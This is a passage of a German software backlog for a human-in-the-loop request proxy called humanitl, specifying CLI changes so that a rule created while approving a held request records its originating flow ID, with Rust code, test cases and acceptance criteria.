- [ ] `make catalog-lint` endet 0. Nach `printf '\n' >> app/assets/catalog/domains.yaml` endet es 1 mit einer Meldung, die beide Pfade nennt (danach `git checkout app/assets/catalog/domains.yaml`).
- [ ] `M2_UI=1 tests/e2e/m2_first_decision/run.sh` endet mit 0. Die Ausgabe enthält keine Zeile mit `SKIPPED:` und keine mit `raise M2_EXPECTED_ASSERTIONS`.
- [ ] Der Lauf meldet mindestens 51 geprüfte Behauptungen, und `M2_EXPECTED_ASSERTIONS` in `tests/e2e/m2_first_decision/run.sh:76` trägt genau die gemeldete Zahl.
- [ ] Zwei dieser Behauptungen betreffen den Namen: die Datei aus `$HUMANITL_E2E_GROUP_SUMMARY` enthält `npm registry` und `Looks like: npm install`. Gegenprobe von Hand: liefert `groupTitle` wieder `group.display`, fallen beide aus und der Lauf endet mit 1.
- [ ] `jq -r '.log.entries | length' "$M2_HAR"` liefert 17, die Datei ist nicht leer.
- [ ] Ein Lauf ohne `app/integration_test/m2_first_decision_test.dart` (Datei versetzen, danach zurück) endet mit 1 und der Meldung, dass sie fehlt, nicht mehr mit 0.
- [ ] `grep -n 'bis HUM-031 den Katalog liefert' backlog/CONVENTIONS.md` liefert null Treffer, und 4.22 führt die Oberflächen-Hälfte von HUM-036 nicht mehr als ausstehend.
- [ ] `grep -n 'Allow/Edit/Block' BACKLOG.md` liefert null Treffer; die M2-Zeile nennt den Editor als M4 mit Verweis auf HUM-047.
- [ ] `make check` grün.

### Fallstricke
- Der Kopf darf den Katalognamen nur führen, wenn er vom Daemon kommt. `catalog_id` kommt von dort, der Apex aus `psl.dart` ist ein Rat, und `backlog/CONVENTIONS.md` 4.13 und 4.15 verbieten eine geratene Domäne in einer Zeile, die eine Entscheidung bewacht. Tragen zwei gehaltene Anfragen einer Gruppe verschiedene `catalog_id` oder gar keine, bleibt es bei „Host und n weitere".
- Die Sonderregel des Gruppen-Modals fällt nur dort weg, wo jeder gehaltene Flow der Gruppe seinen Apex vom Daemon hat. `psl.dart` bleibt als Rückfall stehen, und für solche Gruppen bleibt auch das Modal. Wer `psl.dart` ganz löscht, nimmt dem Fake-Modus die Gruppierung.
- Der Kopf zählt weiterhin nur gehaltene Anfragen (`backlog/CONVENTIONS.md` 4.15, `HeldGroup.flows` gegen `HeldGroup.rows`). Der Katalogname ändert daran nichts.
- `catalog/domains.yaml` trägt `description` als Abbildung `en`/`de`; die Spezifikation von HUM-031 zeigt noch die ältere Form mit einem einzelnen String. Beschreibung und `typical` kommen aus der YAML, nur die Rahmentexte (Kategorie-Chip, „Not in catalog", Rang-Badge, „Typical for") sind ARB-Schlüssel.
- Die Kopie unter `app/assets/` wird nie von Hand gepflegt. Ohne die Prüfung in `make check` driftet sie, und der Bildschirm nennt dann einen anderen Dienst, als der Daemon zugeordnet hat.
- `run.sh:552` erwartet 17 HAR-Einträge, `backlog/sprint-2.md:1669` schreibt 16. Der Lauf trägt die neuere Zahl; wer 16 einsetzt, macht den Schritt rot.
- Die Auflösung unter xvfb bleibt `1600x1000x24` (`run.sh:547`). Darunter greift das schmale Layout, und das rechte Pane ist gar nicht gezeichnet.
- `M2_EXPECTED_ASSERTIONS` muss von Hand nachgezogen werden. Eine zu niedrige Zahl meldet das Skript nur als Hinweis (`run.sh:584-586`) und bleibt grün; nur eine zu hohe bricht ab. Genau darum steht sie in den Akzeptanzkriterien.
- `rootBundle` in einem Widget-Test braucht `TestWidgetsFlutterBinding.ensureInitialized()` vor dem ersten Laden, sonst schlägt das Parsen des Assets mit einer irreführenden Meldung fehl.
- `app/l10n/app_en.arb` und `app_de.arb` werden von mehreren Agenten berührt: nur den eigenen Abschnitt ändern, neue Schlüssel ans Ende anhängen, die Datei unmittelbar vor jedem Schreiben neu einlesen.

### Referenzen
BACKLOG.md Abschnitt 7 (M2), Zeilen 395, 457, 459; `backlog/sprint-2.md` HUM-029, HUM-031, HUM-036 (Zeilen 1605-1695, Schritte `:1659-1667`); `backlog/CONVENTIONS.md` Abschnitt 3 (Provider-Namen), 4.13, 4.15, 4.22; `docs/UX.md` 2.8; `catalog/README.md`, `catalog/domains.schema.json`, `catalog/RANKS-LICENSE`; `yaml` (https://pub.dev/packages/yaml); Flutter integration_test (https://docs.flutter.dev/testing/integration-tests).

---

## HUM-095 · Sitzungsregel aus dem Stapel traegt keine Herkunft
Sprint: 2 · Größe: S · Abhängigkeiten: HUM-027, HUM-036 · Blockiert: HUM-078

### Kontext
ADR-0007 sagt zu: „Jede Regel kann ihre Herkunft nennen (`created_from: <FlowId>`), damit das Rules-Screen ‚erstellt vor 2 min aus Request #41' anzeigen kann." Der Vertrag sagt dasselbe schärfer: `proto/humanitl/v1/rules.proto`:68 kommentiert `created_from_flow_id` mit „Leer, wenn handgeschrieben". Ein leeres Feld ist also keine fehlende Angabe, sondern eine Aussage — diese Regel hat ein Mensch selbst getippt.

Die Kette trägt das Feld überall: `humanitl_core::rule::Rule::created_from` (`daemon/crates/core-types/src/rule.rs`:501), `RulesStore::add` legt die Regel unverändert ab (`daemon/crates/proxy/src/rules_store.rs`:346), `convert::rule_to_proto` schreibt sie zurück (`daemon/crates/ipc/src/convert.rs`:176), und der Regel-Bildschirm zeigt ein Abzeichen mit dem ARB-Schlüssel `rulesOriginFlow` („from {id}", `app/l10n/app_en.arb`:607), das die Anfrage öffnet, aus der die Regel entstand (`app/lib/features/rules/widgets/rule_row.dart`:378-386). Die Oberfläche füllt das Feld auch: `app/lib/features/intercept/rule_sentence.dart`:117 setzt `createdFrom: flow.id`.

Die Kommandozeile kann es nicht. `humanitl flows decide` schickt `remember: None` fest verdrahtet (`daemon/bin/humanitl/src/cmd/flows.rs`:338), und `humanitl rules add` hat kein Flag für die Herkunft (`daemon/bin/humanitl/src/cli.rs`:361-416; `rule_from_args` in `daemon/bin/humanitl/src/cmd/rules.rs`:632 fasst das Feld nie an, `rules.rs`:566 gibt es nur aus). `convert::rule_from_proto` setzt `created_from` nur `if !proto.created_from_flow_id.is_empty()` (`daemon/crates/ipc/src/convert.rs`:1266), also bleibt es `None`, und `rule_row.dart`:380 liefert stillschweigend `SizedBox.shrink()`.

Der M2-Demolauf ist der Beleg dafür, dass das kein Randfall ist, sondern der Normalweg der Kommandozeile: Er legt die Sitzungsregel über `humanitl rules add --expires session` an (`tests/e2e/m2_first_decision/run.sh`:346) und entscheidet die zwölf wartenden Anfragen danach einzeln über `flow_decide` (`run.sh`:369, Helfer `tests/e2e/lib.sh`:425). Die Regel, die der Lauf als „a human releases the whole group and remembers it for this session" vorführt, ist von einer handgeschriebenen Regel nicht zu unterscheiden. Der Lauf ist trotzdem grün, weil er über die Herkunft nichts behauptet; die Lücke steckt im Produkt, nicht in einem Test.

Damit ist heute eine dokumentierte Zusage unwahr, und zwar an der Stelle, an der das Produkt einem Menschen erklärt, woher eine Regel kommt. Das ist der Bruch, nicht die fehlende Bequemlichkeit: `docs/ARCHITECTURE.md` 3b und ADR-0018 sagen, jede Fähigkeit existiere genau einmal als RPC, und UI und CLI seien austauschbare, dünne Clients derselben Proto. `DecideRequest.remember` gibt es, die Oberfläche nutzt es, die Kommandozeile erreicht es nicht. HUM-078 würde das nicht auffangen: `backlog/sprint-4.md`:1629 führt `Humanitl.Decide` mit der Zeile `humanitl flows decide <id> allow|block [--note]` als abgedeckt, und `parity-check` vergleicht Subkommandos, nicht Flags (`docs/adr/0018-rpc-parity.md`:37-44).

### Ziel
`humanitl flows decide <ID> allow|block --remember <PATTERN> [--remember-method M]… [--remember-path P] [--remember-expires WHEN] [--remember-note TEXT]` schickt genau einen `Decide`-Aufruf, in dem `remember` gefüllt ist: Aktion aus dem Verdikt, Host-Muster aus `--remember`, Ablauf ohne eigenes Flag `session`, und `created_from_flow_id` gleich der entschiedenen Id. Ohne `--remember` bleibt der Aufruf Byte für Byte der von heute. Die Ausgabe nennt die angelegte Regel; `--json` trägt sie als `created_rule` samt `created_rule_id`.

### Nicht-Ziel
Keine mehreren Ids je Aufruf. Der Vertrag erlaubt einen Stapel, die Kommandozeile lässt ihn bewusst weg (`daemon/bin/humanitl/src/cmd/flows.rs`:305-310: „auf der Kommandozeile wäre er die bequeme Art, versehentlich mehr freizugeben als gemeint"). Das bleibt so; ein Stapel ist weiterhin die Schleife, und wie in der Oberfläche trägt nur der erste Durchlauf die Regel (`backlog/sprint-2.md`, HUM-029: „eine `Decide` pro Flow, die Regel nur einmal").

Keine Ableitung im Server. `daemon/crates/ipc/src/server.rs`:877-889 reicht die Regel des Clients unverändert an `RulesService::remember`, und `daemon/crates/ipc/src/rules.rs`:155-163 macht nur `read_rule` plus `store.add`. Das bleibt, sonst bräuchten `daemon/crates/ipc/src/fake/mod.rs`:508 und `daemon/crates/ipc/src/validate.rs` dieselbe Ableitung ein zweites Mal — genau die Falle, deretwegen `validate.rs` existiert.

Kein Herkunftsflag für `rules add`. Eine von Hand geschriebene Regel hat keine Anfrage, aus der sie entstand; ein `--created-from` könnte jede beliebige Id behaupten und würde die Aussage des Feldes wertlos machen.

Keine Ableitung des Host-Musters aus dem Flow. Ob eine Freigabe den exakten Host, die registrierbare Domain oder ein `**`-Muster meint, ist Fachlogik und gehört nicht in `bin/humanitl` (`docs/ARCHITECTURE.md` 4). Der Mensch nennt das Muster.

### Betroffene Pfade
- `daemon/bin/humanitl/src/cli.rs`: neue Struktur `RememberArgs` neben `RuleArgs`; `FlowsCmd::Decide` (Zeilen 234-244) bekommt sie als `#[command(flatten)]`
- `daemon/bin/humanitl/src/cmd/flows.rs`: `decide` (Zeilen 316-381) baut die Regel und setzt die Herkunft, `remember: None` (Zeile 338) fällt weg; Doc-Kommentar 305-314 nachziehen
- `daemon/bin/humanitl/src/cmd/rules.rs`: `rule_from_args` (Zeile 632) und `rule_json` (Zeile 544) werden `pub(crate)`
- `daemon/bin/humanitl/tests/cli.rs`: neue Fälle (heute kein einziger Treffer für `created_from` in der Datei)
- `tests/e2e/lib.sh`: `flow_decide` (Zeilen 425-431)
- `tests/e2e/m2_first_decision/run.sh`: Schritt 2 (Zeilen 340-374)
- `backlog/CONVENTIONS.md`: Absatz „Die Stapel-Freigabe geht über zwei Aufrufe" in 4.22 (Zeilen 1306-1318)
- `backlog/sprint-4.md`: Paritätszeile für `Humanitl.Decide` (Zeile 1629)

Nicht betroffen: `proto/` (Feld 6 existiert), `app/` (füllt es schon), `daemon/crates/rules`, `daemon/crates/proxy/src/rules_store.rs`, Migration, ARB.

### Spezifikation

Eigene Flags statt `#[command(flatten)] RuleArgs`, weil `RuleArgs` ein `--note` trägt und `FlowsCmd::Decide` `--note` schon als Notiz an den Agenten hat (`cli.rs`:242-244); zwei Argumente mit demselben langen Namen bricht clap beim Start. Wiederverwendet wird statt dessen der Bauplan:

```rust
// cli.rs, neben RuleArgs
/// Die Regel, die eine Entscheidung hinterlässt.
#[derive(Debug, Clone, Args)]
pub struct RememberArgs {
    /// Host pattern of the rule to remember. Without it nothing is remembered.
    #[arg(long = "remember", value_name = "PATTERN")]
    pub host: Option<String>,

    /// One HTTP method for the rule; repeat the flag for more.
    #[arg(long = "remember-method", value_name = "M", requires = "host",
          value_parser = PossibleValuesParser::new(RULE_METHODS), ignore_case = true)]
    pub method: Vec<String>,

    /// Path glob of the rule, or a regular expression when it starts with `~`.
    #[arg(long = "remember-path", value_name = "P", requires = "host")]
    pub path: Option<String>,

    /// never, session, or a point in time in RFC 3339. Without it: session.
    #[arg(long = "remember-expires", value_name = "WHEN", requires = "host")]
    pub expires: Option<String>,

    /// Why the rule exists. It ends up in rules.yaml and in the window.
    #[arg(long = "remember-note", value_name = "TEXT", requires = "host")]
    pub note: Option<String>,
}

impl RememberArgs {
    /// Die Flags als `RuleArgs`, damit `cmd::rules::rule_from_args` die
    /// einzige Stelle bleibt, die aus Flags eine Wire-Regel baut.
    #[must_use]
    pub fn rule_args(&self, verdict: &str) -> Option<RuleArgs> {
        let host = self.host.clone()?;
        Some(RuleArgs {
            action: Some(verdict.to_owned()),
            host: Some(host),
            method: self.method.clone(),
            path: self.path.clone(),
            expires: Some(self.expires.clone().unwrap_or_else(|| "session".to_owned())),
            note: self.note.clone(),
            scheme: None, port: None, upgrade: None, position: None, allow_private: None,
        })
    }
}
```

In `cmd::flows::decide` vor dem Aufruf:

```rust
let remember = match remember.rule_args(verdict) {
    None => None,
    Some(args) => {
        let mut rule = crate::cmd::rules::rule_from_args(&args, None)?;
        // Die Herkunft steht nirgends sonst: Der Dienst leitet sie nicht aus
        // `flow_ids` ab, er legt die Regel des Clients ab, wie sie kommt.
        rule.created_from_flow_id = id.to_owned();
        Some(rule)
    }
};
```

Regeln im Einzelnen:
- **Aktion aus dem Verdikt.** `allow` ⇒ `RuleAction::Allow`, `block` ⇒ `RuleAction::Block`. Es gibt kein Flag dafür; eine Regel, die dem gerade gefällten Urteil widerspricht, soll nicht entstehen können.
- **`rule_id` bleibt leer.** Der Dienst vergibt sie (`convert.rs`:1244, `fake/mod.rs`:524) und meldet sie als `DecideResponse.created_rule_id` zurück.
- **Ablauf `session` als Default.** Ohne `--remember-expires` steht `session` in der Anfrage. `rule_from_args` würde das Feld sonst leer lassen, und `expiry_from_proto` (`convert.rs`:1301-1306) liest eine fehlende Angabe als `Never`.
- **Unlesbare Id ⇒ kein `remember`.** Schlägt `humanitl_core::FlowId::parse(id)` fehl, wird die Anfrage ohne Regel geschickt. Der Daemon antwortet dann wie ohne das Flag mit `IPC_004` auf die Id (`validate::flow_id`, `daemon/crates/ipc/src/validate.rs`:118-122), statt mit `IPC_005` auf `created_from_flow_id`, und es entsteht keine Regel für einen Flow, den es nicht gibt.
- **Reihenfolge und Rücknahme kommen vom Dienst.** Erst die Regel, dann die Entscheidung; wurde kein einziger Flow entschieden, nimmt der Dienst die Regel zurück (`server.rs`:874-912, `rules.rs`:164-175). Die Kommandozeile macht deshalb einen Aufruf mit `remember` und nie `rules add` gefolgt von `decide`.
- **`--note` und `--remember-note` kreuzen sich nicht.** `--note` bleibt die Notiz an den Agenten im 403-Body und in `X-Humanitl-Note` (HUM-072); `--remember-note` ist `rule.note`.

Ausgabe. `--json` erweitert das bestehende Objekt (`flows.rs`:372-377) um zwei Schlüssel, die ohne `--remember` gar nicht erscheinen, damit vorhandene Aufrufer dieselbe Form sehen wie heute:

```json
{ "flow_id": "018f0001-…-000000010000", "decision": "allow", "note": "", "applied": true,
  "created_rule_id": "018f0002-…", "created_rule": { "host": "**.npmjs.org", "action": "allow",
  "expires": { "kind": "session" }, "created_from_flow_id": "018f0001-…-000000010000", "…": "…" } }
```

Im Klartext folgt der Zeile `allow 01000000` eine zweite: `rule 018f0002 allow **.npmjs.org session`.

### Schritte
1. `RememberArgs` in `cli.rs`, in `FlowsCmd::Decide` flatten. Zwischenzustand: `humanitl flows decide --help` listet die fünf neuen Flags und genau ein `--note`.
2. `rule_from_args` und `rule_json` auf `pub(crate)` heben. Zwischenzustand: `cargo check -p humanitl` grün.
3. `decide` baut die Regel, setzt `created_from_flow_id`, `remember: None` fällt weg; Doc-Kommentar 305-314 sagt, was das Flag tut und warum es weiterhin genau eine Id je Aufruf gibt.
4. Ausgabe erweitern (JSON-Schlüssel, zweite Klartextzeile).
5. Tests in `daemon/bin/humanitl/tests/cli.rs` gegen den Fake-Daemon, Fixture `fixtures/sessions/mixed.jsonl`, gehaltener Flow `018f0001-0000-7000-8000-000000010000`: `decide_remember_carries_origin`, `decide_without_remember_creates_no_rule`, `decide_remember_defaults_to_session`, `decide_remember_note_is_not_the_agent_note`, `decide_remember_bad_pattern_decides_nothing`, `decide_remember_bad_flow_id_keeps_ipc_004`.
6. `tests/e2e/lib.sh` `flow_decide` um wahlfreie Remember-Argumente erweitern, `run.sh` Schritt 2 auf einen Aufruf je Flow umstellen (Regel beim ersten), Kommentar 340-344 anpassen, Lauf grün.
7. `backlog/CONVENTIONS.md` 4.22 und `backlog/sprint-4.md` Zeile 1629 nachziehen.

### Akzeptanzkriterien
- [ ] `humanitl --json flows decide <held-id> allow --remember '**.npmjs.org'` liefert Exit 0, und `jq -r '.created_rule.created_from_flow_id'` der Ausgabe ist genau `<held-id>`, nicht `""` (`decide_remember_carries_origin`).
- [ ] Danach gibt `humanitl --json rules list | jq -r --arg id <created_rule_id> '.rules[] | select(.rule_id == $id) | .created_from_flow_id'` dieselbe Id aus, und `.expires.kind` ist `session`, obwohl kein `--remember-expires` gesetzt war (`decide_remember_defaults_to_session`).
- [ ] `humanitl --json flows decide <held-id> allow` ohne `--remember` gibt weiterhin genau `{"flow_id","decision","note","applied"}` aus, ohne `created_rule_id`, und `rules list` zählt dieselbe Zahl Regeln wie vor dem Aufruf (`decide_without_remember_creates_no_rule`).
- [ ] `humanitl flows decide <held-id> block --remember '**.evil.example' --note 'use PyPI' --remember-note 'blocked group'` legt eine Regel mit `.action == "block"` und `.note == "blocked group"` an; `use PyPI` steht nicht in `.note` (`decide_remember_note_is_not_the_agent_note`).
- [ ] `humanitl flows decide <held-id> allow --remember 'cidr:not-an-address'` liefert Exit 1 mit dem Befund des Daemons, `rules list` hat keine neue Regel, und `flows list --filter 'state:held'` enthält den Flow weiter — die Entscheidung fällt nicht ohne die Regel (`decide_remember_bad_pattern_decides_nothing`).
- [ ] `humanitl flows decide not-a-uuid allow --remember '**.example.com'` liefert Exit 1 mit `IPC_004` und der Zeile über die Flow-Id, nicht mit `IPC_005` über `created_from_flow_id`; `rules list` bleibt unverändert (`decide_remember_bad_flow_id_keeps_ipc_004`).
- [ ] `cargo test -p humanitl --test cli` grün; `grep -c created_from daemon/bin/humanitl/tests/cli.rs` ist größer als 0 (heute 0).
- [ ] `tests/e2e/m2_first_decision/run.sh` Exit 0, `grep -c 'rules add' tests/e2e/m2_first_decision/run.sh` ist 0, und Schritt 2 prüft, dass `created_from_flow_id` der einen Sitzungsregel die Id des zuerst freigegebenen Flows ist.
- [ ] Im Regel-Bildschirm trägt diese Regel das Herkunfts-Abzeichen (`rulesOriginFlow`, letztes UUID-Segment) und der Klick öffnet die Anfrage; ohne den Fix bleibt die Zeile leer (Blick, `app/lib/features/rules/widgets/rule_row.dart`:378).
- [ ] `backlog/CONVENTIONS.md` 4.22 enthält den Absatz „Die Stapel-Freigabe geht über zwei Aufrufe" nicht mehr, und `backlog/sprint-4.md` Zeile 1629 nennt `--remember` in der Paritätszeile für `Humanitl.Decide`.
- [ ] `make check` grün.

### Fallstricke
- `RuleArgs` einfach zu flatten bricht den Start: `--note` gäbe es dann zweimal in `flows decide`, und clap bricht mit „Long option names must be unique" ab. Deshalb `RememberArgs` mit eigenen Namen und `rule_args()` als Brücke auf `rule_from_args`.
- Ohne `--remember-expires` muss `session` in der Anfrage stehen. Ein leeres `expires` wird zu `Never` (`convert.rs`:1301-1306), und eine dauerhafte Regel als Nebenwirkung einer einzelnen Freigabe ist genau die Überraschung, die das Produkt nicht macht.
- Nie `rules add` und danach `decide` aus der Kommandozeile: der Rücknahmeweg des Dienstes greift nur für die Regel aus `remember` (`server.rs`:894-905). Sonst bleibt eine Regel stehen, obwohl kein Flow mehr wartete.
- Beim Stapel trägt nur der erste Aufruf `--remember`. Zwölf Aufrufe mit dem Flag legen zwölf Regeln an; `run.sh` muss die Schleife entsprechend bauen.
- `created_from_flow_id` muss die volle UUID sein (`FlowId::parse`, `daemon/crates/core-types/src/ids.rs`:71). Ein gekürztes Präfix oder die Ausgabe von `short_id` wird von `rule_from_proto` (`convert.rs`:1266-1273) mit `IPC_005` abgewiesen.
- Sitzungsregeln stehen im Speicher, nicht in `rules.yaml` (`CONVENTIONS.md` 4.5). Ein Test, der die Datei liest, sieht nichts; `rules list --json` ist der Ort.
- Der Fake und der echte Dienst müssen gleich bleiben (`daemon/crates/ipc/src/validate.rs`:1-18). Dieses Issue ändert an beiden nichts — das ist der Grund, die Herkunft im Client zu setzen statt sie im Server abzuleiten.
- Die Doku im Doc-Kommentar von `decide` (`flows.rs`:305-314) begründet heute, warum es genau eine Id gibt. Sie darf nach der Änderung nicht so klingen, als sei jetzt auch ein Stapel möglich.

### Referenzen
`docs/adr/0007-rule-model.md` (Herkunft einer Regel); ADR-0018 und `docs/ARCHITECTURE.md` 3b (Parität von UI und CLI, keine Fachlogik in `bin/humanitl`); `backlog/CONVENTIONS.md` 4.5 (Sitzungsregeln) und 4.22 (Befund aus dem M2-Lauf); `backlog/sprint-2.md` HUM-027 (Regel vor Entscheidung, Rücknahme), HUM-029 (eine `Decide` je Flow, Regel nur einmal), HUM-072 (Notiz an den Agenten); `backlog/sprint-4.md` HUM-078 (Paritäts-Tabelle); `proto/humanitl/v1/rules.proto` Feld 6.
